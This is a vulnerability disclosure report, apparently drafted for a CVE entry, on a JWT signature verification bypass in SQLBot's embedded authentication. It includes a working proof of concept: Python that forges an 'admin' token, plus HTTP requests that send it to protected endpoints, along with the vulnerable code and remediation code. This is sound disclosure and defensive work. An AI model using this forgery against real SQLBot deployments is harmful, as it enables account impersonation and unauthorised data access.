# JWT Signature Verification Bypass in Embedded Authentication

## 1. Vulnerability Title
JWT Signature Verification Bypass in Embedded Authentication of SQLBot

## 2. Product Details
* **Vendor:** DataEase / FIT2CLOUD
* **Product:** SQLBot
* **Affected Version(s):** <= v1.3.0
* **Fixed Version:** N/A

## 3. Vulnerability Type (CWE)
* **CWE ID:** CWE-347 (Improper Verification of Cryptographic Signature)
* **Type Name:** JWT Signature Verification Bypass

## 4. Description (Crucial for CVE Entry)
SQLBot version 1.3.0 and earlier contains a JWT signature verification bypass vulnerability in the embedded authentication mechanism. The `validateEmbedded` function explicitly disables both signature verification (`verify_signature: False`) and expiration verification (`verify_exp: False`) when decoding JWT tokens, allowing an attacker to forge arbitrary JWT tokens and impersonate any user if they know a valid assistant/embedded ID.

## 5. Impact
* **Impact Description:** An attacker who knows a valid embedded/assistant ID can:
  - Forge JWT tokens for any user account without knowing the secret key
  - Impersonate any user in the system including administrators
  - Bypass authentication completely for embedded assistant access
  - Access all data and functionality available to the impersonated user
* **Attack Vector:** Network (Remote)
* **Privileges Required:** None (only need to know a valid embedded ID)

## 7. Proof of Concept (PoC) / Steps to Reproduce

### Prerequisites
1. Deploy SQLBot application
2. Obtain a valid embedded/assistant ID (e.g., from frontend code, shared links, or information disclosure)

### Step 1: Craft a Forged JWT Token

The attacker can create a JWT token with any payload without a valid signature:

```python
import jwt
import base64

# Craft malicious payload - impersonate admin user
payload = {
    "account": "admin",  # Target user account
    "appId": "",  # Can be empty if embeddedId is provided
    "embeddedId": "7401549180704919552"  # Valid embedded ID (snowflake ID)
}

# Create JWT without valid signature (signature doesn't matter)
# Using 'none' algorithm or any fake signature
forged_token = jwt.encode(payload, "fake_key", algorithm="HS256")

print(f"Forged Token: Embedded {forged_token}")
```

### Step 2: Send Request with Forged Token

```http
GET /api/v1/chat/list HTTP/1.1
Host: target-server
x-sqlbot-assistant: Embedded eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50IjoiYWRtaW4iLCJhcHBJZCI6IiIsImVtYmVkZGVkSWQiOiI3NDAxNTQ5MTgwNzA0OTE5NTUyIn0.FAKE_SIGNATURE_IGNORED
```

**Result:** The server accepts the forged token because signature verification is disabled. The attacker is now authenticated as "admin" user.

### Step 3: Access Protected Resources

```http
GET /api/v1/user/pager HTTP/1.1
Host: target-server
x-sqlbot-assistant: Embedded <forged_token>
```

**Result:** Returns user list as if the attacker were the admin user.

## 8. Vulnerable Code Location

**File:** `backend/apps/system/middleware/auth.py`

**Lines:** 132-172

### Vulnerable Code: validateEmbedded Function

```python
async def validateEmbedded(self, param: str, trans: I18n) -> tuple[any]:
    try:
        """ payload = jwt.decode(
            param, settings.SECRET_KEY, algorithms=[security.ALGORITHM]
        ) """
        payload: dict = jwt.decode(
            param,
            options={"verify_signature": False, "verify_exp": False},  # VULNERABLE!
            algorithms=[security.ALGORITHM]
        )
        app_key = payload.get('appId', '')
        embeddedId = payload.get('embeddedId', None)
        if not embeddedId:
            embeddedId = xor_decrypt(app_key)
        if not payload['account']:
            return False, f"Miss account payload error!"
        account = payload['account']
        with Session(engine) as session:
            # User lookup by account name from untrusted JWT payload
            session_user = get_user_by_account(session = session, account=account)
            if not session_user:
                message = trans('i18n_not_exist', msg = trans('i18n_user.account'))
                raise Exception(message)
            # ... continues to grant access
```

### Root Cause Analysis

1. **Signature Verification Disabled**: `verify_signature: False` means the JWT signature is not validated
2. **Expiration Check Disabled**: `verify_exp: False` means expired tokens are accepted
3. **User Lookup by Account**: The code trusts the `account` field from the unverified JWT payload
4. **No Additional Validation**: There's no secondary validation to ensure the token was legitimately issued

### Comparison with Secure Implementation

The `validateToken` function (lines 60-89) correctly validates JWT signatures:

```python
async def validateToken(self, token: Optional[str], trans: I18n):
    # ...
    payload = jwt.decode(
        param, settings.SECRET_KEY, algorithms=[security.ALGORITHM]  # SECURE - validates signature
    )
```

## 9. Remediation

Enable JWT signature and expiration verification:

```python
async def validateEmbedded(self, param: str, trans: I18n) -> tuple[any]:
    try:
        # Enable signature and expiration verification
        payload: dict = jwt.decode(
            param,
            settings.SECRET_KEY,  # Use the secret key
            algorithms=[security.ALGORITHM],
            options={"verify_signature": True, "verify_exp": True}  # Enable verification
        )
        # ... rest of the code
```

Alternative: If embedded tokens are meant to be issued by a different system, use a dedicated secret key for embedded authentication:

```python
payload: dict = jwt.decode(
    param,
    settings.EMBEDDED_SECRET_KEY,  # Dedicated key for embedded auth
    algorithms=[security.ALGORITHM],
    options={"verify_signature": True, "verify_exp": True}
)
```

## 10. Summary Table

| Endpoint | Authentication Type | Severity | Impact |
|----------|---------------------|----------|--------|
| All protected endpoints | Embedded JWT | **Critical** | Full authentication bypass, user impersonation |

## 11. Attack Scenario

1. **Information Gathering**: Attacker discovers a valid embedded/assistant ID through:
   - Inspecting frontend JavaScript code on sites using SQLBot embedded assistant
   - Social engineering
   - Information disclosure vulnerabilities
   - Shared/public assistant links

2. **Token Forgery**: Attacker creates a JWT with:
   - `account`: "admin" (or any target username)
   - `embeddedId`: discovered valid ID
   - Any arbitrary signature (will be ignored)

3. **Authentication Bypass**: Attacker sends requests with the forged token using `x-sqlbot-assistant: Embedded <forged_token>` header

4. **Full Access**: Attacker gains access as the impersonated user, potentially with admin privileges

## 12. Exploitation Conditions

| Condition | Difficulty |
|-----------|------------|
| Need valid embedded/assistant ID | Medium - Snowflake ID cannot be enumerated, but may be leaked |
| Need valid username | Low - Common usernames like "admin" often exist |
| JWT forgery | Trivial - No cryptographic knowledge required |
